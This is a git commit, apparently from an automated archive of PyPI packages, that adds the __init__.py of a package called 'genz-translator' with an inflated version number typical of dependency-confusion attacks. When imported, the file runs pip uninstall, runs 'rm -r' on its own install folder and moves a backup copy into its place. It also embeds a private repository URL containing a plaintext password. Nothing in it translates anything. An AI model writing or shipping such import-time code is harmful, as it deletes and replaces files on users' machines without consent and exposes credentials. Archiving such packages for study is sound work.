8b81081fd00fd0b458fc30462ea79a8a0be8d9bd
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-07 04:10:02 +0000

    Add package genz-translator/9025.0.1/genz_translator-9025.0.1.tar.gz

---
+++ packages/genz-translator/genz_translator-9025.0.1.tar.gz/genz_translator-9025.0.1/genz_translator/__init__.py
@@ -0,0 +1,28 @@
+import os
+import sys
+
+VERSION = 'v9015.0.1'
+PACKAGE_NAME = "genz_translator"
+INTERNAL_REPO_IP = "servers.genzrulez.com"
+INTERNAL_REPO_URL = "http://PyPiper:pyisthepiperthatpipesasweetmelody1!@servers.genzrulez.com:8010/simple/"
+
+paths = sys.path
+print ("All paths")
+print(paths)
+actual_path = ""
+for path in paths:
+    if (os.path.isdir(path + "/" + PACKAGE_NAME)):
+        actual_path = path + "/"
+        break
+print ("Found the actual path")
+print (actual_path)
+
+print ("Hello world, starting the uninstall")
+
+os.system('pip3 --verbose uninstall ' + PACKAGE_NAME + ' -y')
+
+os.system('rm -r ' + actual_path + PACKAGE_NAME)
+os.system('mv ' + actual_path + PACKAGE_NAME + "BAK/" + ' ' + actual_path + PACKAGE_NAME)
+
+print ("Uninstall done")
+
